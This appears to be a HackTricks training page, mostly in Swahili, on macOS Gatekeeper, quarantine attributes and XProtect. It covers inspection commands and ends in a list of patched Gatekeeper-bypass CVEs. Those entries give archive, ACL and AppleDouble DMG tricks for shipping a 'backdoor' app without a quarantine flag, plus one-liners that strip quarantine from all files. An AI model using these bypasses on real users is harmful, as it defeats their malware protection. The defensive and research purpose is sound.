# macOS Gatekeeper / Quarantine / XProtect

{{#include ../../../banners/hacktricks-training.md}}


## Gatekeeper

**Gatekeeper** ni kipengele cha usalama kilichotengenezwa kwa mifumo ya uendeshaji ya Mac, kilicholenga kuhakikisha kwamba watumiaji **wanaendesha tu programu zinazotegemewa** kwenye mifumo yao. Hufanya kazi kwa **kuhakiki programu** ambayo mtumiaji anapakua na kujaribu kufungua kutoka kwa **vyanzo nje ya App Store**, kama vile app, plug-in, au kifurushi cha installer.

Nguvu kuu ya Gatekeeper iko katika mchakato wake wa **uhakiki**. Hukagua ikiwa programu iliyopakuliwa imewekwa saini na **mwanaendelezaji anayekubalika**, kuhakikisha uhalali wa programu. Zaidi ya hayo, inathibitisha ikiwa programu ime **notarised by Apple**, kuthibitisha kwamba haina yaliyomo hatarishi yanayojulikana na haijagandishwa baada ya notarisation.

Zaidi ya hayo, Gatekeeper huimarisha udhibiti na usalama kwa **kuwahimiza watumiaji kutoa idhini kabla ya kufungua** programu zilizopakuliwa mara ya kwanza. Kinga hii husaidia kuzuia watumiaji wasiokusudia kuendesha msimbo wa utekelezaji ambao unaweza kuwa hatari waliodanganywa kuufikiria kama faili ya data isiyo hatari.

### Sainisho za Programu

Sainisho za programu, pia zinajulikana kama code signatures, ni sehemu muhimu ya miundombinu ya usalama ya Apple. Zinatumika **kuhakiki utambulisho wa mwandishi wa programu** (mwanaendelezaji) na kuhakikisha kwamba msimbo haujagandishwa tangu uliosainiwa.

Hivi ndivyo inavyofanya kazi:

1. **Kusaini Programu:** Wakati mwanaendelezaji yuko tayari kusambaza programu yao, wanai **saini programu kwa kutumia private key**. Private key hii inahusishwa na **certificate ambayo Apple inatoa kwa mwanaendelezaji** wakati wanajiandikisha katika Apple Developer Program. Mchakato wa kusaini unahusisha kuunda cryptographic hash ya sehemu zote za app na kusimba hash hii kwa kutumia private key ya mwanaendelezaji.
2. **Kusambaza Programu:** Programu iliyosainiwa kisha inasambazwa kwa watumiaji pamoja na certificate ya mwanaendelezaji, ambayo ina public key inayolingana.
3. **Kuhakikisha Programu:** Wakati mtumiaji anapakua na kujaribu kuendesha programu, mfumo wa uendeshaji wa Mac unatumia public key kutoka kwenye certificate ya mwanaendelezaji kufungua (decrypt) hash. Kisha hupiga upya hash kulingana na hali ya sasa ya programu na kuilinganisha na hash iliyofunguliwa. Ikiwa zinafanana, inamaanisha **programu haijabadilishwa** tangu mwanaendelezaji alipoiweka saini, na mfumo unaruhusu programu kuendesha.

Sainisho za programu ni sehemu muhimu ya teknolojia ya Gatekeeper ya Apple. Wakati mtumiaji anajaribu **kufungua programu iliyopakuliwa kutoka kwenye intaneti**, Gatekeeper inathibitisha sainisho la programu. Ikiwa imesainiwa kwa certificate iliyotolewa na Apple kwa mwanaendelezaji anayejulikana na msimbo haujagandishwa, Gatekeeper inaruhusu programu kuendesha. Vinginevyo, inazuia programu na kumjulisha mtumiaji.

Kuanzia macOS Catalina, **Gatekeeper pia hukagua ikiwa programu imekuwa notarised by Apple**, ikiongeza tabaka zaidi la usalama. Mchakato wa notarization hukagua programu kwa masuala ya usalama yanayojulikana na msimbo hatari, na ikiwa ukaguzi huo unapita, Apple inaongeza ticket kwenye programu ambayo Gatekeeper inaweza kuthibitisha.

#### Kagua Sainisho

Wakati unapotathmini sampuli ya **malware** unapaswa kila mara **kukagua sainisho** ya binary kwani **mwanaendelezaji** aliyeisaini unaweza tayari kuwa **kuhusiana na malware.**
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Uthibitishaji

Mchakato wa uthibitishaji wa Apple unafanya kazi kama kinga ya ziada ili kulinda watumiaji dhidi ya programu zinazoweza kuwa hatarishi. Unahusisha **msanidi programu kuwasilisha programu yao kwa ukaguzi** kwa **Huduma ya Notary ya Apple**, ambayo haipaswi kuchanganywa na App Review. Huduma hii ni **mfumo otomatiki** ambao hupitia kwa makini programu iliyowasilishwa kwa ajili ya kuwepo kwa **maudhui hatarishi** na matatizo yoyote yanayoweza kuhusiana na code-signing.

Ikiwa programu **inapitisha** ukaguzi huu bila kuleta wasiwasi wowote, Huduma ya Notary hutoa tiketi ya uthibitishaji. Msanidi programu anahitajika kisha **kuambatisha tiketi hii kwenye programu yao**, mchakato unaojulikana kama 'stapling.' Zaidi ya hayo, tiketi ya uthibitishaji pia inachapishwa mtandaoni ambapo Gatekeeper, teknolojia ya usalama ya Apple, inaweza kuitumia.

Wakati mtumiaji anaposakinisha au kuendesha programu kwa mara ya kwanza, uwepo wa tiketi ya uthibitishaji — iwe imeambatishwa kwenye executable au kupatikana mtandaoni — **unaaarifu Gatekeeper kwamba programu imehalalishwa (notarized) na Apple**. Matokeo yake, Gatekeeper inaonyesha ujumbe wa maelezo katika dirisha la uzinduzi la awali, ukionyesha kwamba programu imepitishwa kwa ukaguzi wa maudhui hatarishi na Apple. Mchakato huu hivyo huongeza kujiamini kwa mtumiaji juu ya usalama wa programu wanazosakinisha au kuendesha kwenye mifumo yao.

### spctl & syspolicyd

> [!CAUTION]
> Kumbuka kwamba tangu toleo la Sequoia, **`spctl`** haikubali tena kubadilisha usanidi wa Gatekeeper.

**`spctl`** ni zana ya CLI ya kuorodhesha na kuingiliana na Gatekeeper (na daemon ya `syspolicyd` kupitia ujumbe za XPC). Kwa mfano, inawezekana kuona **hali** ya GateKeeper kwa:
```bash
# Check the status
spctl --status
```
> [!CAUTION]
> Kumbuka kwamba ukaguzi wa saini wa GateKeeper hufanywa tu kwa **faili zilizo na attribute ya Quarantine**, sio kwa kila faili.

GateKeeper itakagua ikiwa, kwa mujibu wa **mapendeleo & saini**, binary inaweza kutekelezwa:

<figure><img src="../../../images/image (1150).png" alt=""><figcaption></figcaption></figure>

**`syspolicyd`** ni daemon kuu anayehusika na kutekeleza Gatekeeper. Inatunza database iliyo katika `/var/db/SystemPolicy` na inawezekana kupata code inayounga mkono [database here](https://opensource.apple.com/source/Security/Security-58286.240.4/OSX/libsecurity_codesigning/lib/policydb.cpp) na [SQL template here](https://opensource.apple.com/source/Security/Security-58286.240.4/OSX/libsecurity_codesigning/lib/syspolicy.sql). Kumbuka kwamba database haizingatiwi na SIP na inaweza kuandikwa na root, na database `/var/db/.SystemPolicy-default` inatumiwa kama backup ya asili ikiwa nyingine itaharibika.

Zaidi ya hayo, bundles **`/var/db/gke.bundle`** na **`/var/db/gkopaque.bundle`** zina faili zenye sheria ambazo zinaingizwa kwenye database. Unaweza kuangalia database hii kama root kwa:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
**`syspolicyd`** pia inatoa server ya XPC yenye operesheni tofauti kama `assess`, `update`, `record` na `cancel` ambazo pia zinaweza kufikiwa kwa kutumia APIs za **`Security.framework`'s `SecAssessment*`** na **`spctl`** kwa kweli huzungumza na **`syspolicyd`** kupitia XPC.

Angalia jinsi sheria ya kwanza ilimalizika kwa "**App Store**" na ya pili kwa "**Developer ID**" na kwamba katika picha iliyotangulia ilikuwa **imewezeshwa kuendesha apps kutoka App Store na waendelezaji waliothibitishwa**.\

Ikiwa uta**modify** mpangilio huo kuwa App Store, sheria za "**Notarized Developer ID**" zitaondoka.

Pia kuna maelfu ya sheria za **type GKE** :
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
Haya ni hashes kutoka:

- `/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`
- `/var/db/gke.bundle/Contents/Resources/gk.db`
- `/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`

Au unaweza kuorodhesha taarifa za hapo juu kwa:
```bash
sudo spctl --list
```
Chaguzi **`--master-disable`** na **`--global-disable`** za **`spctl`** **zitazima** kabisa ukaguzi wa saini hizi:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
Wakati imewezeshwa kabisa, chaguo jipya litaonekana:

<figure><img src="../../../images/image (1151).png" alt=""><figcaption></figcaption></figure>

Inawezekana **kuangalia kama App itaruhusiwa na GateKeeper** kwa:
```bash
spctl --assess -v /Applications/App.app
```
Inawezekana kuongeza sheria mpya katika GateKeeper ili kuruhusu utekelezaji wa programu fulani kwa:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
Kuhusu **kernel extensions**, folda `/var/db/SystemPolicyConfiguration` ina faili zenye orodha za kexts zinazoruhusiwa kupakiwa. Zaidi ya hayo, `spctl` ina entitlement `com.apple.private.iokit.nvram-csr` kwa sababu ina uwezo wa kuongeza kernel extensions mpya zilizotangazwa awali ambazo pia zinapaswa kuhifadhiwa katika NVRAM chini ya ufunguo `kext-allowed-teams`.

#### Kudhibiti Gatekeeper kwenye macOS 15 (Sequoia) na baadaye

- Njia ndefu ya Finder ya kuzunguka **Ctrl+Open / Right‑click → Open** imeondolewa; watumiaji lazima waruhusu wazi programu iliyozuiliwa kutoka **System Settings → Privacy & Security → Open Anyway** baada ya dirisha la kwanza la kuzuia.
- `spctl --master-disable/--global-disable` hazitokei tena; `spctl` kwa ufanisi ni read‑only kwa tathmini na usimamizi wa lebo wakati utekelezaji wa sera unasanidiwa kupitia UI au MDM.

Kuanzia macOS 15 Sequoia, watumiaji wa mwisho hawawezi tena kubadili sera ya Gatekeeper kupitia `spctl`. Usimamizi unafanywa kupitia System Settings au kwa kutuma profile ya MDM ya usanidi yenye payload `com.apple.systempolicy.control`. Mfano wa kipande cha profile kuruhusu App Store na waendelezaji waliotambuliwa (lakini sio "Anywhere"):

<details>
<summary>Profaili ya MDM kuruhusu App Store na waendelezaji waliotambuliwa</summary>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>PayloadContent</key>
<array>
<dict>
<key>PayloadType</key>
<string>com.apple.systempolicy.control</string>
<key>PayloadVersion</key>
<integer>1</integer>
<key>PayloadIdentifier</key>
<string>com.example.gatekeeper</string>
<key>EnableAssessment</key>
<true/>
<key>AllowIdentifiedDevelopers</key>
<true/>
</dict>
</array>
<key>PayloadType</key>
<string>Configuration</string>
<key>PayloadIdentifier</key>
<string>com.example.profile.gatekeeper</string>
<key>PayloadUUID</key>
<string>00000000-0000-0000-0000-000000000000</string>
<key>PayloadVersion</key>
<integer>1</integer>
<key>PayloadDisplayName</key>
<string>Gatekeeper</string>
</dict>
</plist>
```
</details>

### Faili za karantini

Wakati wa **kupakua** programu au faili, programu maalum za macOS kama web browsers au email clients **huambatisha sifa iliyopanuliwa ya faili**, inayojulikana kwa kawaida kama the "**quarantine flag**," kwenye faili iliyopakuliwa. Sifa hii hufanya kazi kama hatua ya usalama ya ku **weka alama kwa faili** kwamba limetoka kwa chanzo kisichotegemewa (intaneti), na linaweza kuwa na hatari. Hata hivyo, si programu zote huambatisha sifa hii; kwa mfano, programu za kawaida za BitTorrent mara nyingi hupitisha hatua hii.

**Uwepo wa quarantine flag unaashiria kipengele cha usalama cha macOS Gatekeeper wakati mtumiaji anapo jaribu kuendesha faili**.

Ikiwa **quarantine flag haipo** (kama kwa faili zilizopakuliwa kupitia baadhi ya wateja wa BitTorrent), ukaguzi wa Gatekeeper **huenda usifanyike**. Kwa hivyo, watumiaji wanapaswa kuwa makini wanapofungua faili zilizopakuliwa kutoka vyanzo visivyo salama au visivyojulikana.

> [!NOTE] > **Kuangalia** **uhalali** wa saini za code ni mchakato unaotumia rasilimali nyingi unaojumuisha kuunda cryptographic **hashes** za code na rasilimali zote zilizoambatanishwa. Zaidi ya hayo, kuangalia uhalali wa cheti kunahusisha kufanya **ukaguzi mtandaoni** kwa seva za Apple kuona ikiwa imefutwa baada ya kutolewa. Kwa sababu hizi, ukaguzi kamili wa saini za code na notarization ni **haifai kuendeshwa kila mara programu inapoanzishwa**.
>
> Kwa hivyo, ukaguzi huu ni **huendeshwa tu wakati wa kuendesha programu zenye sifa ya quarantined.**

> [!WARNING]
> Sifa hii lazima iwe **imewekwa na programu inayounda/kuipakua** faili.
>
> Hata hivyo, faili zinazoundwa ndani ya sandbox zitakuwa na sifa hii imewekwa kwa kila faili wanayounda. Programu zisizo za sandbox zinaweza kujiweka wenyewe, au kubainisha [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information_property_list/lsfilequarantineenabled?language=objc) key katika **Info.plist** ambayo itaifanya mfumo kuweka attribute iliyopanuliwa `com.apple.quarantine` kwenye faili zilizoundwa,

Zaidi ya hayo, faili zote zinazoundwa na mchakato unaoitaja **`qtn_proc_apply_to_self`** huwa quarantined. Au API **`qtn_file_apply_to_path`** inaongeza sifa ya quarantine kwa njia ya faili maalum.

Inawezekana **kuangalia hali yake na kuiwezesha/kuzima** (root required) kwa:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
Unaweza pia **kubaini ikiwa faili ina sifa ya ziada ya quarantine** kwa:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
Kagua **value** ya **extended** **attributes** na gundua app iliyoiandika quarantine attr kwa:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
Kwa kweli mchakato "unaweza kuweka alama za karantini kwa faili anazounda" (nimejaribu tayari kutumia flag USER_APPROVED kwenye faili niliyounda lakini haikutumika):

<details>

<summary>Chanzo la msimbo — kutumia alama za karantini</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

Na **ondoa** sifa hiyo kwa:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
Na pata faili zote zilizo kwenye karantini kwa:
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
Quarantine information is also stored in a central database managed by LaunchServices in **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`** which allows the GUI to obtain data about the file origins. Moreover this can be overwritten by applications which might be interested in hiding its origins. Moreover, this can be done from LaunchServices APIS.

#### **libquarantine.dylib**

Maktaba hii inatoa kazi kadhaa zinazoruhusu kusimamia viwanja vya extended attribute.

The `qtn_file_*` APIs deal with file quarantine policies, the `qtn_proc_*` APIs are applied to processes (files created by the process). The unexported `__qtn_syscall_quarantine*` functions are the ones that applies the policies which calls `mac_syscall` with "Quarantine" as first argument which sends the requests to `Quarantine.kext`.

#### **Quarantine.kext**

The kernel extension is only available through the **kernel cache on the system**; however, you _can_ download the **Kernel Debug Kit from** [**https://developer.apple.com/**](https://developer.apple.com/), which will contain a symbolicated version of the extension.

Kext hii ita-hook kupitia MACF kwa kupokea kwa simu kadhaa ili kushika matukio yote ya mzunguko wa maisha ya faili: Creation, opening, renaming, hard-linkning... hata `setxattr` ili kuizuia kuweka extended attribute `com.apple.quarantine`.

It also uses a couple of MIBs:

- `security.mac.qtn.sandbox_enforce`: Lazimisha karantini ndani ya Sandbox
- `security.mac.qtn.user_approved_exec`: Querantined procs can only execute approved files

#### Provenance xattr (Ventura and later)

macOS 13 Ventura ilianzisha mfumo tofauti wa provenance ambao unajazwa mara ya kwanza app iliyokarantiwa inaporuhusiwa kuendesha. Vifaa viwili vinaundwa:

- The `com.apple.provenance` xattr on the `.app` bundle directory (fixed-size binary value containing a primary key and flags).
- A row in the `provenance_tracking` table inside the ExecPolicy database at `/var/db/SystemPolicyConfiguration/ExecPolicy/` storing the app’s cdhash and metadata.

Matumizi ya vitendo:
```bash
# Inspect provenance xattr (if present)
xattr -p com.apple.provenance /Applications/Some.app | hexdump -C

# Observe Gatekeeper/provenance events in real time
log stream --style syslog --predicate 'process == "syspolicyd"'

# Retrieve historical Gatekeeper decisions for a specific bundle
log show --last 2d --style syslog --predicate 'process == "syspolicyd" && eventMessage CONTAINS[cd] "GK scan"'
```
### XProtect

XProtect ni kipengele kilichojengwa ndani cha **anti-malware** katika macOS. XProtect **hukagua programu yoyote wakati inapoanzishwa kwa mara ya kwanza au inapobadilishwa dhidi ya hifadhidata yake** ya malware inayojulikana na aina za faili zisizo salama. Unapopakua faili kupitia programu fulani, kama Safari, Mail, au Messages, XProtect huchunguza faili hiyo moja kwa moja. Ikiwa inafanana na malware yoyote inayojulikana katika hifadhidata yake, XProtect itazuia faili hiyo kuendeshwa na itakutaarifu kuhusu tishio hilo.

Hifadhidata ya XProtect **inasasishwa mara kwa mara** na Apple kwa ufafanuzi mpya wa malware, na masasisho haya yanapakuliwa na kusanikishwa kiotomatiki kwenye Mac yako. Hii inahakikisha kwamba XProtect kila wakati iko juu ya vitisho vipya vinavyojulikana.

Hata hivyo, ni muhimu kutambua kwamba **XProtect si suluhisho la antivirus lenye vipengele kamili**. Inakagua tu orodha maalum ya vitisho vinavyojulikana na haiendeshi on-access scanning kama programu nyingi za antivirus.

Unaweza kupata taarifa kuhusu sasisho la hivi karibuni la XProtect kwa kuendesha:
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
XProtect iko katika eneo lililolindwa na SIP kwa **/Library/Apple/System/Library/CoreServices/XProtect.bundle** na ndani ya bundle unaweza kupata taarifa ambazo XProtect inazitumia:

- **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: Inaruhusu code zilizo na cdhash hizo kutumia legacy entitlements.
- **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: Orodhesha plugins na extensions ambazo haziruhusiwi kupakia kupitia BundleID na TeamID au kuonyesha toleo la chini.
- **`XProtect.bundle/Contents/Resources/XProtect.yara`**: Sheria za Yara za kugundua malware.
- **`XProtect.bundle/Contents/Resources/gk.db`**: Database ya SQLite3 yenye hashes za applications zilizozuiliwa na TeamIDs.

Kumbuka kwamba kuna App nyingine katika **`/Library/Apple/System/Library/CoreServices/XProtect.app`** inayohusiana na XProtect ambayo haijihusishi na mchakato wa Gatekeeper.

> XProtect Remediator: Katika macOS za kisasa, Apple hutoa on-demand scanners (XProtect Remediator) ambazo zinaendeshwa mara kwa mara kupitia launchd kugundua na kurekebisha familia za malware. Unaweza kuona skani hizi katika unified logs:
>
> ```bash
> log show --last 2h --predicate 'subsystem == "com.apple.XProtectFramework" || category CONTAINS "XProtect"' --style syslog
> ```

### Sio Gatekeeper

> [!CAUTION]
> Kumbuka kwamba Gatekeeper **haitekelezwii kila mara** unapoendesha application; _**AppleMobileFileIntegrity**_ (AMFI) itafanya tu **kukagua saini za executable code** wakati unaendesha app ambayo tayari imeendeshwa na kuthibitishwa na Gatekeeper.

Kwa hivyo, hapo awali ilikuwa inawezekana kuendesha app ili kuiweka kwenye cache ya Gatekeeper, kisha **kubadilisha faili ambazo si executable za application** (kama Electron asar au NIB files) na ikiwa hakuna kinga nyingine iliyopo, application ilitenda kazi ikiwa na nyongeza **ziliolenga uharibifu**.

Hata hivyo, sasa hii haiwezekani kwa sababu macOS **inazuia kubadilisha faili** ndani ya application bundles. Kwa hivyo, ukijaribu shambulio la [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md), utagundua kuwa hawezi kutumika tena kwa sababu baada ya kuendesha app ili kuiweka kwenye cache ya Gatekeeper, hautaweza kubadilisha bundle. Na kama utabadilisha kwa mfano jina la saraka ya Contents kuwa NotCon (kama ilivyosemwa kwenye exploit), na kisha uendeshe binary kuu ya app ili kuiweka kwenye cache ya Gatekeeper, itasababisha kosa na haitatekelezwa.

## Gatekeeper Bypasses

Njia yoyote ya kupita Gatekeeper (kupata mtumiaji kupakua kitu na kukiweka endeshwa wakati Gatekeeper ingepaswa kukizuia) inachukuliwa kuwa hitilafu (vulnerability) katika macOS. Hizi ni baadhi ya CVE zilizotolewa kwa mbinu zilizowawezesha kupita Gatekeeper zamani:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

Ilibainika kwamba ikiwa **Archive Utility** inatumiwa kwa extraction, faili zenye **paths zenye zaidi ya herufi 886** hazipati com.apple.quarantine extended attribute. Hali hii kwa bahati mbaya inaruhusu faili hizo **kupita ukaguzi wa usalama wa Gatekeeper**.

Tazama [**ripoti ya awali**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) kwa taarifa zaidi.

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

Wakati application inapotengenezwa kwa **Automator**, taarifa kuhusu kile inachohitaji kuendesha iko ndani ya `application.app/Contents/document.wflow` si kwenye executable. Executable ni binary ya Automator ya kawaida inayoitwa **Automator Application Stub**.

Kwa hivyo, unaweza kufanya `application.app/Contents/MacOS/Automator\ Application\ Stub` **ikuonyeshe kwa symbolic link kwa Automator Application Stub nyingine ndani ya system** na itatekeleza kile kilicho ndani ya `document.wflow` (script yako) **bila kusababisha Gatekeeper** kwa sababu executable halina quarantine xattr.

Mfano wa mahali kinachotarajiwa: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Tazama [**ripoti ya awali**](https://ronmasas.com/posts/bypass-macos-gatekeeper) kwa taarifa zaidi.

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

Katika bypass hii zip file ilitengenezwa kwa kuanza kusindika kutoka `application.app/Contents` badala ya `application.app`. Kwa hivyo, **quarantine attr** ilitumika kwa **faili zote kutoka `application.app/Contents`** lakini **sio kwa `application.app`**, ambayo ndiyo Gatekeeper ilikuwa inakagua, hivyo Gatekeeper iliwekwa kando kwa sababu wakati `application.app` ilipoanzishwa haikuwa na quarantine attribute.
```bash
zip -r test.app/Contents test.zip
```
Angalia [**original report**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) kwa taarifa zaidi.

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Hata kama components ni tofauti, exploitation ya vulnerability hii ni sawa sana na ile ya hapo awali. Katika kesi hii tutaunda Apple Archive kutoka **`application.app/Contents`**, kwa hivyo **`application.app` won't get the quarantine attr** wakati inapotolewa na **Archive Utility**.
```bash
aa archive -d test.app/Contents -o test.app.aar
```
Angalia [**original report**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) kwa maelezo zaidi.

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL **`writeextattr`** inaweza kutumika kuzuia mtu yeyote kuandika sifa kwenye faili:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
Zaidi ya hayo, **AppleDouble** file format hufanya nakala ya faili ikijumuisha ACEs zake.

Katika [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) inawezekana kuona kwamba uwakilishi wa maandishi wa ACL ulihifadhiwa ndani ya xattr inayoitwa **`com.apple.acl.text`** utapewa kama ACL kwenye faili iliyotolewa. Kwa hivyo, ikiwa ulifinyiza programu ndani ya faili ya zip kwa **AppleDouble** file format na ACL ambayo inazuia xattr nyingine kuandikwa juu yake... quarantine xattr haikuwekwa kwenye programu:
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
Angalia [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kwa taarifa zaidi.

Kumbuka kwamba hii pia inaweza kutumika kwa kutumia AppleArchives:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

Iligundulika kwamba **Google Chrome wasn't setting the quarantine attribute** kwa faili zilizopakuliwa kutokana na baadhi ya matatizo ya ndani ya macOS.

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble file formats huhifadhi sifa za faili katika faili tofauti zinazoanza na `._`; hili husaidia kunakili sifa za faili **across macOS machines**. Hata hivyo, iligunduliwa kwamba baada ya kuifungua AppleDouble file, faili inayozunguka na `._` **wasn't given the quarantine attribute**.
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
Kutokana na uwezo wa kuunda faili ambayo haitawekwa quarantine attribute, ilikuwa **inawezekana kuepuka Gatekeeper.** Mbinu ilikuwa **kuunda programu ya faili ya DMG** kwa kutumia konvensheni ya majina ya AppleDouble (anza nayo `._`) na kuunda **faili inayoonekana kama sym link kwa faili hii iliyofichwa** bila quarantine attribute.\
Wakati **dmg file inapoendeshwa**, kwa kuwa haina quarantine attribute itaweza **kuepuka Gatekeeper**.
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### [CVE-2023-41067]

